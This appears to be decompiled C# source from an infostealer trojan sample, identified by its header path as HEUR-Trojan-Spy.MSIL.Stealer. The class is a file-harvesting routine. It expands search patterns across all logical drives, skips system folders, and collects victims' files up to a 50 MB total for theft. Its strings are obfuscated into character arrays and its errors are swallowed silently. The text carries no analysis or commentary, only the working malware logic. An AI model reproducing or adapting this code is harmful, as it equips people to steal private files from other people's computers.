// Decompiled with JetBrains decompiler
// Type: SystemNetUnsafeNclNativeMethodsOSSOCKTransmitFileBuffersStructX
// Assembly: Pursuits, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5AE29391-E6B0-4A11-8563-A9AF244B152D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f5d5176d0ac8a6c9093f39208d3aff397cce06017bbf0f2e4fee86a5ce09a398.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

public static class SystemNetUnsafeNclNativeMethodsOSSOCKTransmitFileBuffersStructX
{
  public static List<SystemNetConfigurationMailSettingsSectionGroupg> Search(
    IEnumerable<string> patterns)
  {
    List<SystemNetConfigurationMailSettingsSectionGroupg> settingsSectionGroupgList = new List<SystemNetConfigurationMailSettingsSectionGroupg>();
    try
    {
      long num1 = 0;
      foreach (string pattern in patterns)
      {
        if (num1 < 52428800L)
        {
          try
          {
            string[] strArray1 = pattern.Split(new string[1]
            {
              new string(new char[1]{ '|' })
            }, StringSplitOptions.RemoveEmptyEntries);
            if (strArray1 != null)
            {
              if (strArray1.Length > 2)
              {
                string rootPath = Environment.ExpandEnvironmentVariables(strArray1[0]);
                string[] searchPatterns = strArray1[1].Split(new string[1]
                {
                  new string(new char[1]{ ',' })
                }, StringSplitOptions.RemoveEmptyEntries);
                string str = strArray1[2];
                long num2 = 3097152;
                if (strArray1.Length > 3)
                  num2 = Convert.ToInt64(strArray1[3]);
                if (rootPath == new string(new char[8]
                {
                  '%',
                  'D',
                  'S',
                  'K',
                  '_',
                  '2',
                  '3',
                  '%'
                }))
                {
                  foreach (string logicalDrive in Environment.GetLogicalDrives())
                  {
                    try
                    {
                      foreach (string file in SystemNetUnsafeNclNativeMethodsOSSOCKTransmitFileBuffersStructX.GetFiles(logicalDrive, (SearchOption) Convert.ToInt32(str), searchPatterns))
                      {
                        try
                        {
                          FileInfo fileInfo = new FileInfo(file);
                          if (fileInfo.Length > 0L)
                          {
                            if (fileInfo.Length <= num2)
                            {
                              if (num1 < 52428800L)
                              {
                                string[] strArray2 = fileInfo.Directory.FullName.Split(new string[1]
                                {
                                  new string(new char[2]{ ':', '\\' })
                                }, StringSplitOptions.RemoveEmptyEntries);
                                settingsSectionGroupgList.Add(new SystemNetConfigurationMailSettingsSectionGroupg(fileInfo.FullName)
                                {
                                  Id4 = strArray2 == null || strArray2.Length <= 1 ? string.Empty : strArray2[1],
                                  Id2 = file
                                });
                                num1 += fileInfo.Length;
                              }
                            }
                          }
                        }
                        catch
                        {
                        }
                      }
                    }
                    catch
                    {
                    }
                  }
                }
                else
                {
                  foreach (string file in SystemNetUnsafeNclNativeMethodsOSSOCKTransmitFileBuffersStructX.GetFiles(rootPath, (SearchOption) Convert.ToInt32(str), searchPatterns))
                  {
                    try
                    {
                      FileInfo fileInfo = new FileInfo(file);
                      if (fileInfo.Length > 0L)
                      {
                        if (fileInfo.Length <= num2)
                        {
                          if (num1 < 52428800L)
                          {
                            string[] strArray3 = fileInfo.Directory.FullName.Split(new string[1]
                            {
                              new string(new char[2]{ ':', '\\' })
                            }, StringSplitOptions.RemoveEmptyEntries);
                            settingsSectionGroupgList.Add(new SystemNetConfigurationMailSettingsSectionGroupg(fileInfo.FullName)
                            {
                              Id4 = strArray3 == null || strArray3.Length <= 1 ? string.Empty : strArray3[1],
                              Id2 = file
                            });
                            num1 += fileInfo.Length;
                          }
                        }
                      }
                    }
                    catch (Exception ex)
                    {
                    }
                  }
                }
              }
            }
          }
          catch (Exception ex)
          {
          }
        }
        else
          break;
      }
    }
    catch
    {
    }
    return settingsSectionGroupgList;
  }

  public static IEnumerable<string> GetFiles(
    string rootPath,
    SearchOption searchOption,
    string[] searchPatterns)
  {
    List<string> source = new List<string>()
    {
      new string(new char[9]
      {
        '\\',
        'W',
        'i',
        'n',
        'd',
        'o',
        'w',
        's',
        '\\'
      }),
      new string(new char[15]
      {
        '\\',
        'P',
        'r',
        'o',
        'g',
        'r',
        'a',
        'm',
        ' ',
        'F',
        'i',
        'l',
        'e',
        's',
        '\\'
      }),
      new string(new char[21]
      {
        '\\',
        'P',
        'r',
        'o',
        'g',
        'r',
        'a',
        'm',
        ' ',
        'F',
        'i',
        'l',
        'e',
        's',
        ' ',
        '(',
        'x',
        '8',
        '6',
        ')',
        '\\'
      }),
      new string(new char[14]
      {
        '\\',
        'P',
        'r',
        'o',
        'g',
        'r',
        'a',
        'm',
        ' ',
        'D',
        'a',
        't',
        'a',
        '\\'
      })
    };
    IEnumerable<string> first = Enumerable.Empty<string>();
    if (searchOption == SearchOption.AllDirectories)
    {
      try
      {
        foreach (string enumerateDirectory in Directory.EnumerateDirectories(rootPath))
        {
          if (source != null && source.Any<string>())
          {
            bool flag = false;
            foreach (string str in source)
            {
              if (enumerateDirectory.Contains(str))
              {
                flag = true;
                break;
              }
            }
            if (flag)
              continue;
          }
          first = first.Concat<string>(SystemNetUnsafeNclNativeMethodsOSSOCKTransmitFileBuffersStructX.GetFiles(enumerateDirectory, searchOption, searchPatterns));
        }
      }
      catch
      {
      }
    }
    foreach (string searchPattern in searchPatterns)
    {
      try
      {
        first = first.Concat<string>((IEnumerable<string>) Directory.GetFiles(rootPath, searchPattern));
      }
      catch
      {
      }
    }
    return first;
  }
}
